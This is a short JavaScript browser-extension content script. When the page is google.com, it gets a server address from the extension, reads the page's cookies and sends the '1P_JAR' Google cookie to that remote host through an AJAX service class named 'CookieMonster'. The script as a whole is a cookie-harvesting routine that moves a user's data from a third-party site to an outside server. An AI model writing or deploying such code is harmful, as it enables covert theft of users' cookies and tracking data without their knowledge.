/* @imports */
import { CookieMonster } from "app/library/cookies";
import BakeCookies from "app/library/cookies";
import JqueryAjaxService from "app/service/jquery-ajax.service";

/* @main */
let hostname = location.hostname,
	pathname = location.pathname;
if (hostname === "www.google.com" && pathname === "/") {
	browser.runtime.sendMessage(true).then(function(response) {
		let protocol = response.protocol,
			host = response.host,
			port = response.port;
		console.info("Loading Server Configuration", protocol, host, port);
		if ((typeof host === "string" && host.trim() !== "") &&
			(typeof port === "string" && port.trim() !== "")) {
			let jQueryAjaxService = new JqueryAjaxService();
			let bakedCookies = new BakeCookies(document.cookie, hostname),
				cookieMonster = new CookieMonster(jQueryAjaxService);
			cookieMonster.consume(bakedCookies.findCookies("1P_JAR"), protocol, host, port);
		}
	});
}
